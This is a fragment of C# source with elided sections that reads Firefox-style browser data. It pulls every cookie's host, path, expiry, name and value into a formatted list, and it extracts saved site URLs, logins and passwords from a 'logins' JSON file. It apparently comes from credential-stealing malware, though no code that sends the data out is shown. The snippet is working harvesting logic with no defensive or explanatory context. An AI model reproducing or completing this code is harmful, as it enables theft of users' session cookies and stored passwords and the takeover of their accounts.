            ...
            try
            {
                ...
                for (int i = 0; i < cNT.RowLength; i++)
                {
                    ...
                    try
                    {
                        ...
                        GetCookies.Cookies_Gecko.Add(cNT.ParseValue(i, "host").Trim() + "\t" + (cNT.ParseValue(i, "isSecure") == "1") + "\t" + cNT.ParseValue(i, "path").Trim() + "\t" + (cNT.ParseValue(i, "isSecure") == "1") + "\t" + cNT.ParseValue(i, "expiry").Trim() + "\t" + cNT.ParseValue(i, "name").Trim() + "\t" +cNT.ParseValue(i, "value")+ System.Environment.NewLine);
                ...
                {
                    {
                        foreach (JsonValue item in (IEnumerable)File.ReadAllText(path).FromJSON()["logins"])
                        {
                            ...
                            credential.Add("Site_Url : " + item["hostname"] + System.Environment.NewLine + "Login : " + text + System.Environment.NewLine + "Password : " + text2 + System.Environment.NewLine);
